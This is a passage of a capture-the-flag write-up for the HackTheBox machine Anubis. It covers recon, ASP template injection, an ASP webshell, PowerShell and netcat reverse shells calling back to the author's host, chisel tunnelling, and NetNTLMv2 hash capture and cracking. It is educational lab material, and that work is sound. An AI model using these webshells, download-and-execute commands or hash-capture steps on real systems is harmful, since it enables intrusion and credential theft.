---
title: HTB: Anubis
url: https://0xdf.gitlab.io/2022/01/29/htb-anubis.html
date: 2022-01-29T14:45:00+00:00
difficulty: Insane [50]
os: Windows
tags: hackthebox, ctf, htb-anubis, nmap, iis, crackmapexec, vhosts, wfuzz, feroxbuster, ssti, xss, certificate, adcs, htb-sizzle, youtube, openssl, certificate-authority, client-certificate, tunnel, chisel, proxychains, foxyproxy, wireshark, responder, hashcat, net-ntlmv2, smbclient, jamovi, cve-2021-28079, electron, javascript, certutil, certreq, certify, certificate-template, kerberos, klist, kinit, evil-winrm, posh-adcs, rubeus, sharp-collection, powerview, psexec-py, faketime, osep-plus
---

![Anubis](https://0xdfimages.gitlab.io/img/anubis-cover.png)

Anubis starts simply enough, with a ASP injection leading to code execution in a Windows Docker container. In the container I’ll find a certificate request, which leaks the hostname of an internal web server. That server is handling software installs, and by giving it my IP, I’ll capture and crack the NetNTLMv2 hash associated with the account doing the installs. That account provides SMB access, where I find Jamovi files, one of which has been accessed recently. I’ll exploit these files to get execution and a foothold on the host. To escalate, I’ll find a certificate template that the current user has full control over. I’ll use that control to add smart card authentication as a purpose for the template, and create one for administrator. I’ll show how to do this the more manual way, getting the certificate and then authenticating with Kerveros from my Linux VM. Then I’ll go back and do it again using PoshADCS and Rubeus all on Anubis.

## Box Info

| Name | [Anubis](https://hackthebox.com/machines/anubis)  [Anubis](https://hackthebox.com/machines/anubis) [Play on HackTheBox](https://hackthebox.com/machines/anubis) |
| --- | --- |
| Release Date | [14 Aug 2021](https://twitter.com/hackthebox_eu/status/1425867220173959171) |
| Retire Date | 29 Jan 2022 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Anubis |
| Radar Graph | Radar chart for Anubis |
| First Blood User | 00:27:20[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 00:26:46[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [4ndr34z 4ndr34z](https://app.hackthebox.com/users/55079) |

## Recon

### nmap

`nmap` found five open TCP ports, NetBios (135), HTTPS (443), SMB (445), and two ports related to RPC (593 and 49721):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.102
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-21 18:06 EST
Nmap scan report for 10.10.11.102
Host is up (0.025s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
443/tcp   open  https
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49721/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
oxdf@hacky$ nmap -p 135,443,445,593 -sCV -oA scans/nmap-tcpscripts 10.10.11.102
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-21 18:11 EST
Nmap scan report for 10.10.11.102
Host is up (0.024s latency).

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Not valid before: 2021-05-24T19:44:56
|_Not valid after:  2031-05-24T19:54:56
|_ssl-date: 2022-01-22T00:15:41+00:00; +1h03m04s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp open  microsoft-ds?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h03m05s, deviation: 2s, median: 1h03m03s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-22T00:15:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.17 seconds

```

I’m used to seeing headers that say IIS for 80 and 443, but this says HTTPAPI, which is what you typically see with WinRM and other services like that.

The certificate does give a common name of `www.windcorp.htb`. I’ll manually inspect the certificate, but nothing else of use is there.

Finally, `nmap` notes a clock-skew of around 1 hour and 3 minutes. That will cause issues at the end, so it’s worth noticing here.

### SMB - TCP 445

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) confirms the domain name `nmap` found in the certificate, and gives a hostname, EARTH:

```

oxdf@hacky$ crackmapexec smb 10.10.11.102
SMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)

```

`smbclient` says it gets a null session, but doesn’t report any shares:

```

oxdf@hacky$ smbclient -N -L //10.10.11.102
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

```

I’ll need to check back if I find creds.

### VHosts

Given the use of the domain, I’ll start a fuzz for other virtual hosts in the background:

```

oxdf@hacky$ wfuzz -u https://10.10.11.102 -H "Host: FUZZ.windcorp.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 315
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.11.102/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000001:   200        1007 L   3245 W   46774 Ch    "www"
000037212:   400        6 L      26 W     334 Ch      "*"

Total time: 385.5649
Processed Requests: 100000
Filtered Requests: 99998
Requests/sec.: 259.3596

```

Nothing new, but I’ll still add the base domain and the www subdomain to my `/etc/hosts` file.

### Website - TCP 80

#### Site

Visiting the IP or `windcorp.htb` returns a 404:

![image-20220121182147737](https://0xdfimages.gitlab.io/img/image-20220121182147737.png)

On visiting `www.windcorp.htb`, there’s a page for a website design company:

[![image-20220121182412980](https://0xdfimages.gitlab.io/img/image-20220121182412980.png)](https://0xdfimages.gitlab.io/img/image-20220121182412980.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220121182412980.png)

Almost all of the links on the page are dead or lead elsewhere on the same page, except the two at the bottom. The “Join Our Newsletter” field takes an email:

![image-20220126165532949](https://0xdfimages.gitlab.io/img/image-20220126165532949.png)

On giving it anything, the page returns 405:

![image-20220122062603551](https://0xdfimages.gitlab.io/img/image-20220122062603551.png)

Burp history shows it’s just sending a POST to `/`. So this looks like nothing.

The “Contact Us” section takes a name, email, subject, and message:

![image-20220122062702284](https://0xdfimages.gitlab.io/img/image-20220122062702284.png)

Filling it out and submitting leads to a preview:

![image-20220122062756434](https://0xdfimages.gitlab.io/img/image-20220122062756434.png)

Either button seems to lead back to the main page.

#### Tech Stack

Looking at the response headers, the `Server` header shows “Microsoft-IIS/10.0” (I’ll later see that the site is hosted in Docker, and only the hostname is being forwarded through). That says the box is Win10/Server 2016+ (which makes sense).

Looking at the only interactive with any page other than the index, the “Contact Us” form sends a GET request (a bit odd for a form) with the information to `/save.asp`:

```

GET /save.asp?name=0xdf&email=0xdf%40windcorp.htb&subject=Hello%3F&message=Test+%232 HTTP/2
Host: www.windcorp.htb
Cookie: ASPSESSIONIDAWSSBRTR=LCCPHFPBLFPCOHGAMNCFJBOL
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.windcorp.htb/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

```

The server returns a 302 redirect to `/preview.asp` and sets a cookie, `ASPSESSIONIDAWSSBRTR`:

```

HTTP/2 302 Found
Cache-Control: private
Content-Type: text/html
Location: https://www.windcorp.htb/preview.asp
Server: Microsoft-IIS/10.0
Set-Cookie: ASPSESSIONIDAWSSBRTR=MCCPHFPBIHHHEFNCAIAOKGEH; secure; path=/
Date: Sat, 22 Jan 2022 11:33:17 GMT
Content-Length: 157

```

The client requests `/preview.asp` with the cookie and no other information. I thought maybe it was the cookie that informed the server what message to preview, but I proved that wrong by sending the GET request to Repeater, changing and removing the cookie, and the same preview came up each time. My theory at this point is that it’s loading my message based on my IP address (but it turns out it’s even simpler than that).

The root page doesn’t load as `index.asp`, but as `index.html`. It is interesting that both the `.asp` file extension and the lack of a “X-Powered-By: ASP.NET” header suggest this site is using old school ASP, and not ASPX. There’s also none of the `VIEWSTATE` named cookies that typically come with ASPX applications.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x asp` based on the headers above, and with a lowercase wordlist as IIS is case insensitive:

```

oxdf@hacky$ feroxbuster -k -u https://www.windcorp.htb -x asp -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://www.windcorp.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [asp]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        5l       10w        0c https://www.windcorp.htb/test.asp
301      GET        2l       10w      155c https://www.windcorp.htb/assets => https://www.windcorp.htb/assets/
301      GET        2l       10w      158c https://www.windcorp.htb/assets/js => https://www.windcorp.htb/assets/js/
301      GET        2l       10w      159c https://www.windcorp.htb/assets/css => https://www.windcorp.htb/assets/css/
301      GET        2l       10w      159c https://www.windcorp.htb/assets/img => https://www.windcorp.htb/assets/img/
301      GET        2l       10w      154c https://www.windcorp.htb/forms => https://www.windcorp.htb/forms/
200      GET      384l     1123w        0c https://www.windcorp.htb/services.asp
301      GET        2l       10w      167c https://www.windcorp.htb/assets/img/clients => https://www.windcorp.htb/assets/img/clients/
200      GET       75l      229w        0c https://www.windcorp.htb/preview.asp
301      GET        2l       10w      169c https://www.windcorp.htb/assets/img/portfolio => https://www.windcorp.htb/assets/img/portfolio/
301      GET        2l       10w      172c https://www.windcorp.htb/assets/img/testimonials => https://www.windcorp.htb/assets/img/testimonials/
301      GET        2l       10w      164c https://www.windcorp.htb/assets/img/team => https://www.windcorp.htb/assets/img/team/
301      GET        2l       10w      162c https://www.windcorp.htb/assets/vendor => https://www.windcorp.htb/assets/vendor/
302      GET        2l       10w      157c https://www.windcorp.htb/save.asp => https://www.windcorp.htb/preview.asp
301      GET        2l       10w      166c https://www.windcorp.htb/assets/vendor/aos => https://www.windcorp.htb/assets/vendor/aos/
[####################] - 6m    637992/637992  0s      found:15      errors:3223   
[####################] - 6m     53166/53166   143/s   https://www.windcorp.htb 
...[snip]...

```

`test.asp` shows four labels with the data I most recently submitted:

![image-20220122083100327](https://0xdfimages.gitlab.io/img/image-20220122083100327.png)

`services.asp` looks like the bottom section of the main page.

Both of these are either leftover from development, or it’s somehow being included in `index.html`. The fact that `test.asp` updates each time I submit is interesting for sure.

## Shell as SYSTEM in webserver 01

### Test Input Sanitization

#### XSS

I’ll grab the `/save.asp` request in Repeater and start trying different payloads. I’ll try including `<script>` tags with no obfuscation:

![image-20220122083523721](https://0xdfimages.gitlab.io/img/image-20220122083523721.png)

Both `test.asp` and `preview.asp` show the alert:

![](https://0xdfimages.gitlab.io/img/anubis-xss-test.png)

I want to see if there’s an admin or someone besides me who sees this input. I’ll create a payload that loads from my server in the most benign way possible, a simple `<img>` tag:

![image-20220122084136643](https://0xdfimages.gitlab.io/img/image-20220122084136643.png)

When I send that and load it myself, there is a request at my HTTP server from me:

```
10.10.14.6 - - [22/Jan/2022 08:40:40] code 404, message File not found
10.10.14.6 - - [22/Jan/2022 08:40:40] "GET /xss.jpg HTTP/1.1" 404 -

```

I would expect in HTB that if there is intended automated user interaction, I would see some contact within a few minutes. I left that running for a long while, but no one else ever tried to load it.

#### ASP SSTI

Much like how in PHP, the `.php` file is a mix of raw HTML and code that’s executed server-side inside `<?php ?>` , ASP places it’s code inside `<% %>`. So for something like `<?php echo "testing execution"; ?>`, the ASP equivalent would be `<% Response.Write("testing execution") %>`, or even the shorthand `<%="testing execution" %>`. This is a form of server-side template injection (SSTI).

Given that the input I’m sending seem to be being written to `test.asp` and then included, there’s a reasonable chance that input could be executed on the server. I’ll give it a try, and it works:

![image-20220122085529373](https://0xdfimages.gitlab.io/img/image-20220122085529373.png)

An alternative way to identify this injection would be to start scanning for bad characters in the submission. [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect) recommends this payload to start:

![image-20220126170140198](https://0xdfimages.gitlab.io/img/image-20220126170140198.png)

On submitting, the request to `save.asp` seems to work find, but on being redirected to `preview.asp`, things crash:

![image-20220126170149635](https://0xdfimages.gitlab.io/img/image-20220126170149635.png)

This is very similar to giving `'` and finding SQL injection. Now that I found a crash, I can play with different combinations of these characters until I isolate that it’s the ASP injection.

### Execution

#### POC

As a novice at ASP, I did some Googling for simple ASP webshells. I used [this](https://github.com/tennc/webshell/blob/master/asp/webshell.asp) as a reference. It looks like to run something, I just need to create a `WScript.Shell` object, call its `exec` method, and then get the output from the return.

To start really simple, I’ll hardcode in the command `whoami`:

```

<%
Set shell = CreateObject("WScript.Shell")
Set proc = shell.exec("whoami")
Response.Write(proc.StdOut.ReadAll)
%>

```

When I submit this through the form (to avoid having to put all that into the GET parameter by hand), it redirects to `/preview.asp`:

![image-20220122090118162](https://0xdfimages.gitlab.io/img/image-20220122090118162.png)

SYSTEM already? Seems too easy for an insane box.

#### Webshell

To read a parameter in ASP, it looks like I just need to call `request([parameter name])`. I’ll update the payload to the following and submit in the form:

```

<%
Set shell = CreateObject("WScript.Shell")
Set proc = shell.exec(request("cmd"))
Response.Write(proc.StdOut.ReadAll)
%>

```

On submitting, there’s an error in the page:

![image-20220122090328672](https://0xdfimages.gitlab.io/img/image-20220122090328672.png)

That does confirm the theory that `preview.asp` is including `test.asp`. It’s crashing because there’s no `cmd` parameter. I’ll add `?cmd=whoami` to the end of the URL. It works:

![image-20220122090434159](https://0xdfimages.gitlab.io/img/image-20220122090434159.png)

#### Reverse Shell

I’ll grab [this PowerShell Reverse Shell one liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3), update it with my IP, and save it as `rev.ps1`. I’ll start a Python webserver on 80 and `rlwrap nc` on 443. Then I’ll send the command `powershell -c curl -usebasicparsing http://10.10.14.6/rev.ps1 | iex`, which will fetch the PS1 and execute it. When I do, there’s a hit on the webserver:

```
10.10.11.102 - - [22/Jan/2022 15:25:14] "GET /rev.ps1 HTTP/1.1" 200 -

```

And then a connection at `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.102 49906

```

If I hit enter I’ll get a prompt, and can run commands::

```

PS C:\windows\system32\inetsrv> whoami
nt authority\system

```

#### Shell Improvement

This shell was a bit flaky. It doesn’t show error messages, and died on me a few times. So I’ll upload [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe) and connect back:

```

PS C:\users\public\desktop> curl http://10.10.14.6/nc64.exe -outfile \users\public\desktop\nc64.exe
PS C:\users\public\desktop> .\nc64.exe -e powershell 10.10.14.6 443

```

At another `nc`, I’ve got a shell:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.102 49908
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\users\public\desktop>

```

Alternatively, I can use this one post to the website to get a `nc` shell:

```

<%
Set shell = CreateObject("WScript.Shell")
Set proc = shell.exec("powershell -c curl -outfile C:\nc64.exe http://10.10.14.6/nc64.exe; C:\nc64.exe -e powershell 10.10.14.6 444")
Response.Write(proc.StdOut.ReadAll)
%>

```

## Auth as localadmin

### Enumeration

#### Container

I’m system here, but I’m not on the host. The hostname is webserver01, and the IP address isn’t the 10.10.11.102 that I had set to `windcorp.htb`:

```

PS C:\users\administrator\desktop> hostname
webserver01
PS C:\users\administrator\desktop> ipconfig

Windows IP Configuration

Ethernet adapter vEthernet (Ethernet):

   Connection-specific DNS Suffix  . : htb
   Link-local IPv6 Address . . . . . : fe80::f0d0:da3a:8d88:c68a%32
   IPv4 Address. . . . . . . . . . . : 172.20.159.137
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 172.20.144.1

```

That’s a huge network (4094 hosts).

Interestingly, the root doesn’t even have a `ProgramData` directory:

```

PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/25/2021  11:23 PM                inetpub
d-r---        5/24/2021  10:49 PM                Program Files
d-----         4/9/2021  10:34 PM                Program Files (x86)
d-r---         4/9/2021  10:37 PM                Users
d-----        4/26/2021  12:32 AM                Windows

```

#### Users

The only users in this container are Administrator, ContainerAdministrator, and ContainerUser:

```

PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/9/2021  10:36 PM                Administrator
d-----        5/25/2021  12:05 PM                ContainerAdministrator
d-----         4/9/2021  10:37 PM                ContainerUser
d-r---         4/9/2021  10:36 PM                Public 

```

ContainerAdministrator does have a `.ssh` directory, but only a `known_hosts` file:

```

PS C:\users\containeradministrator> ls .ssh 

    Directory: C:\users\containeradministrator\.ssh

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/25/2021  12:05 PM            175 known_hosts

PS C:\users\containeradministrator> cat .ssh\known_hosts
192.168.66.3 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGUobz+s+TDcuqCZNX5rFUE2Wse501X8g6qNUIRx6pVkVXvgAp8dMPdqsUytg3x4t7N85nbSHVHY/uVYrzpRuEM=

```

This must be a relic of development, as I can’t access anything at 192.168.66.3.

Where I might find `user.txt` or `root.txt` on the Administrator’s desktop, there’s a single file, `req.txt`:

```

PS C:\users\administrator\desktop> cat req.txt 
-----BEGIN CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
...[snip]...
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
4TlwpQ==
-----END CERTIFICATE REQUEST-----

```

This is a certificate signing request. I could use an online decoder (like [this one](https://www.sslshopper.com/csr-decoder.html)), or just run the command that site gives:

```

oxdf@hacky$ openssl req -in req.txt -noout -text
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:a6:9b:4a:ff:85:91:c2:2a:c2:bf:04:3e:ce:15:
                    d2:f6:23:db:c5:f2:82:1e:6a:13:12:f4:b6:fd:b1:
...[snip]...
                    26:70:59:13:c5:bc:61:6e:d7:1e:79:4a:fb:38:d4:
                    a7:77
                Exponent: 65537 (0x10001)
        Attributes:
            a0:00
    Signature Algorithm: sha256WithRSAEncryption
         6b:ac:75:c1:11:97:70:30:62:4c:0f:87:27:33:07:96:36:9b:
...[snip]...

```

The common name is `softwareportal.windcorp.htb`.

#### softwareportal

I’ll add `softwareportal.windcorp.htb` to my `/etc/hosts` file, but trying to visit the page just hangs. It is likely an internal website. I tried just `curl` from a PowerShell terminal, but the domain doesn’t resolve from here:

```

PS C:\users\public\desktop> curl softwareportal.windcorp.htb
curl softwareportal.windcorp.htb
curl : The remote name could not be resolved: 'softwareportal.windcorp.htb'
At line:1 char:1
+ curl softwareportal.windcorp.htb
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invok 
   e-WebRequest], WebException
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeW 
   ebRequestCommand

```

If I take a guess that the gateway may be the host, just requesting it returns a 404 page:

```

PS C:\users\public\desktop> curl 172.20.144.1
curl 172.20.144.1                   
curl : <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Not Found</TITLE>                
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>                   
<BODY><h2>Not Found</h2>                
<hr><p>HTTP Error 404. The requested resource is not found.</p>
</BODY></HTML>                     
At line:1 char:1                         
+ curl 172.20.144.1                       
+ ~~~~~~~~~~~~~~~~~                        
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invok 
   e-WebRequest], WebException                                                                                                          
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeW 
   ebRequestCommand 

```

Still, the fact that it’s a returning 404 indicates there is a webserver running on the gateway.

If I try again with the `Host` header, it works:

```

PS C:\users\public\desktop> curl 172.20.144.1 -Headers @{"Host"="softwareportal.windcorp.htb"} -UseBasicParsing

StatusCode        : 200
StatusDescription : OK
Content           : 
                    <!DOCTYPE html>
                    <html lang="en">
                        <head>
                            <meta charset="utf-8" />
                            <meta name="viewport" content="width=device-width, initial-scale=1, 
                    shrink-to-fit=no" />
                            <meta name="descr...
RawContent        : HTTP/1.1 200 OK
                    Content-Length: 10404
                    Cache-Control: private
                    Content-Type: text/html
                    Date: Mon, 24 Jan 2022 19:36:09 GMT
                    Set-Cookie: ASPSESSIONIDSSDCRDCS=DHCPMPHDILIFILFBBMJBIDPA; path=/
                    Server:...
Forms             : 
Headers           : {[Content-Length, 10404], [Cache-Control, private], [Content-Type, 
                    text/html], [Date, Mon, 24 Jan 2022 19:36:09 GMT]...}
Images            : {@{outerHTML=<img class="img-fluid" 
                    src="assets/img/portfolio/thumbnails/1.jpg" alt="" />; tagName=IMG; 
                    class=img-fluid; src=assets/img/portfolio/thumbnails/1.jpg; alt=}, 
...[snip]...

```

Given that I know the IP of this host name, I’ll edit `/etc/hosts` to point the domain to the gateway IP.

### Create Tunnel

#### Chisel

[Chisel](https://github.com/jpillora/chisel) is my favorite tool for creating tunnels through a foothold (see [my tutorial on it](/cheatsheets/chisel)). I’ll download the latest Windows and Linux version from the [release page](https://github.com/jpillora/chisel/releases/latest), decompress them, and upload the Windows version to the container:

```

PS C:\users\public\desktop> curl http://10.10.14.6/chisel.exe -outfile c.exe

```

Now on my VM I’ll start the server:

```

oxdf@hacky$ ./chisel_1.7.6_linux_amd64 server -p 8000 --reverse
2022/01/24 13:42:23 server: Reverse tunnelling enabled
2022/01/24 13:42:23 server: Fingerprint MHxSP1Ei/dP3OpHyk8wtvl93BWyXR1bp/mNlkO7VyRc=
2022/01/24 13:42:23 server: Listening on http://0.0.0.0:8000

```

From the container, I’ll connect back enabling a SOCKS5 proxy:

```

PS C:\users\public\desktop> .\c.exe client 10.10.14.6:8000 R:socks
.\c.exe client 10.10.14.6:8000 R:socks
2022/01/24 20:43:01 client: Connecting to ws://10.10.14.6:8000
2022/01/24 20:43:01 client: Connected (Latency 106.5691ms)

```

The connection shows on my VM:

```

2022/01/24 13:43:00 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

#### proxychains

I’ll use `proxychains` to use this tunnel from the command line. In `/etc/proxychains.conf` I’ll make sure the only proxylist is localhost port 1080 (what Chisel is listening on):

```

[ProxyList]
socks5  127.0.0.1 1080

```

Now I can use `curl`:

```

oxdf@hacky$ proxychains curl softwareportal.windcorp.htb                                               
ProxyChains-3.1 (http://proxychains.sf.net)                                                                                             
|S-chain|-<>-127.0.0.1:1080-<><>-172.20.144.1:80-<><>-OK
                                                                                                                                        
<!DOCTYPE html>
<html lang="en">
    <head>                                
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Windcorp Software-Portal</title>
        <!-- Favicon-->
        <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico" />
...[snip]...

```

#### FoxyProxy

I also want to see the site through Firefox. I’ll configure FoxyProxy to use the tunnel as well. First, I’ll create a profile for SOCKS5 on localhost port 1080:

![image-20220124135729390](https://0xdfimages.gitlab.io/img/image-20220124135729390.png)

On clicking “Save & Edit Patterns”, I’ll add `softwareportal.windcorp.htb` to the whitelist:

![image-20220124135827555](https://0xdfimages.gitlab.io/img/image-20220124135827555.png)

It’s important to do it via patterns because the page has several assets (CSS, JS, etc) that are on the internet, so if I just point all traffic into the tunnel, it will get the page, but then hang trying to load those assets though Anubis which doesn’t have internet access.

Now I can visiting gives the page.

### Software Portal

The software portal page is an internal company software repo:

[![image-20220124140108893](https://0xdfimages.gitlab.io/img/image-20220124140108893.png)](https://0xdfimages.gitlab.io/img/image-20220124140108893.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220124140108893.png)

Midway down the page is a list of software:

![software](https://0xdfimages.gitlab.io/img/anubis-software.png)

It says that you don’t need to be local admin to install these approved software. The links to the various software look like:

```

http://softwareportal.windcorp.htb/install.asp?client=172.20.159.137&software=VNC-Viewer-6.20.529-Windows.exe

```

Clicking on one gives an indication that something is happening, and then redirects back to the software portal.

### Get localadmin’s Password

#### Identify Protocol

I’ll start Wireshark and substitute my own IP as the `client` parameter in the URL. In Wireshark, there’s the HTTP exchange, followed by 18 attempts to connect to my host on TCP 5985, WimRM:

[![image-20220124155616455](https://0xdfimages.gitlab.io/img/image-20220124155616455.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220124155616455.png)

My host is sending TCP resets because it’s not listening on 5985. It looks like the server is trying to connect to my machine on WinRM to install software.

#### Responder

If that’s the case, I want to capture the authentication attempts to my machine. [Responder](https://github.com/lgandx/Responder) includes a WinRM server. I’ll start it, giving it `-I tun0`, and then refresh the request for software at my IP. A hash comes in for the localadmin user:

```

[WinRM] NTLMv2 Client   : ::ffff:10.10.11.102                                                            
[WinRM] NTLMv2 Username : windcorp\localadmin                                                            
[WinRM] NTLMv2 Hash     : localadmin::windcorp:8f2208c4e775e4a5:83769DD8278CD572E3B790A6103B6A27:010100000000000075BDCBD66D11D8010D1A0AE462D6D92B0000000002000800520037004100300001001E00570049004E002D004D004C00480038004600380053004A004700340057000400140052003700410030002E004C004F00430041004C0003003400570049004E002D004D004C00480038004600380053004A004700340057002E0052003700410030002E004C004F00430041004C000500140052003700410030002E004C004F00430041004C0008003000300000000000000000000000002100005E9EFB0072F0DB09335795E647161D2644BBD87D6E220CB116D3D829238ABCCC0A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310034002E0036000000000000000000

```

#### Hashcat

The hash is a NetNTLMv2, and matches that format (mode 5600) on the Hashcat [example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) wiki. I’ll start `hashcat`, and it breaks almost instantly as “Secret123”:

```

$ hashcat -m 5600 localadmin.hash /usr/share/wordlists/rockyou.txt 
...[snip]...
LOCALADMIN::windcorp:8f2208c4e775e4a5:83769dd8278cd572e3b790a6103b6a27:010100000000000075bdcbd66d11d8010d1a0ae462d6d92b0000000002000800520037004100300001001e00570049004e002d004d004c00480038004600380053004a004700340057000400140052003700410030002e004c004f00430041004c0003003400570049004e002d004d004c00480038004600380053004a004700340057002e0052003700410030002e004c004f00430041004c000500140052003700410030002e004c004f00430041004c0008003000300000000000000000000000002100005e9efb0072f0db09335795e647161d2644bbd87d6e220cb116d3d829238abccc0a0010000000000000000000000000000000000009001e0048005400540050002f00310030002e00310030002e00310034002e0036000000000000000000:Secret123
...[snip]...

```

### SMB Access

`crackmapexec` verifies these creds are good, and work for SMB:

```

oxdf@hacky$ crackmapexec smb 10.10.11.102 -u localadmin -p 'Secret123'
SMB         10.10.11.102    445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.102    445    EARTH            [+] windcorp.htb\localadmin:Secret123

```

Still, there’s no `pwned`, so these creds aren’t actually local administrator to run something like `psexec`.

## Shell as diegocruz

### SMB Enumeration

With creds, I can now list the shares on the host:

```

oxdf@hacky$ smbclient --user=windcorp.htb/localadmin -L //10.10.11.102
Enter WINDCORP.HTB\localadmin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

I tried through `proxychains` back at the gateway, and it seems to return the same list:

```

oxdf@hacky$ proxychains smbclient -U windcorp/localadmin -L //softwareportal.windcorp.htb
ProxyChains-3.1 (http://proxychains.sf.net)
